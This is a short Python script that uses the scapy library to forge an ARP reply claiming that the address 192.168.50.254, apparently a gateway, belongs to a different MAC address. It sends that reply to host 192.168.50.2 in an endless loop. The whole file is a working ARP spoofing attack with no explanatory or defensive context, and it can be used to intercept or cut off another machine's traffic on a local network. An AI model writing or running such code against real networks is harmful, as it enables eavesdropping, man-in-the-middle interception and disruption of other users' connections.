import scapy.all as sc


packet=sc.Ether(dst='dc:0e:a1:35:99:b6')/sc.ARP(op=2 ,hwdst='dc:0e:a1:35:99:b6' ,hwsrc='dc:0e:a1:35:99:b4' , psrc='192.168.50.254', pdst='192.168.50.2')

while True :        
    sc.sendp(packet , iface='Ethernet') 

# sc.ls(sc.ARP)




